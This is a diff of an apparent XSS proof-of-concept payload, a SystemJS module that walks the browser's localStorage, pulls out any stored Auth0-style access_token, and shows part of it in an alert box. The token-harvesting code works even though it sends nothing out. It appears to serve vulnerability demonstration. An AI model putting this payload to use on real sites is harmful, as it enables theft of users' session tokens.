@@ -1,14 +1,17 @@
 System.register([], function () {
   return { execute: function () {
+    var found = null, key = null;
     try {
-      var k = Object.keys(localStorage).find(function (x) {
-        return /auth0/i.test(x) && /openid/i.test(x);
-      });
-      var at = "(none)";
-      try { at = JSON.parse(localStorage.getItem(k)).body.access_token; } catch (e) {}
-      alert("XSS executing in origin: " + location.origin +
-            "\nAuth0 token key: " + (k || "none") +
-            "\naccess_token (first 40): " + String(at).slice(0, 40) + "…");
-    } catch (e) { alert("ran in " + location.origin + " | err: " + e); }
+      for (var i = 0; i < localStorage.length; i++) {
+        var k = localStorage.key(i);
+        try {
+          var v = JSON.parse(localStorage.getItem(k));
+          if (v && v.body && v.body.access_token) { found = v.body.access_token; key = k; break; }
+        } catch (e) {}
+      }
+    } catch (e) {}
+    alert("XSS executing in origin: " + location.origin +
+          "\nToken key: " + (key || "none") +
+          "\naccess_token (first 40): " + (found ? String(found).slice(0, 40) + "…" : "(none)"));
   }};
 });
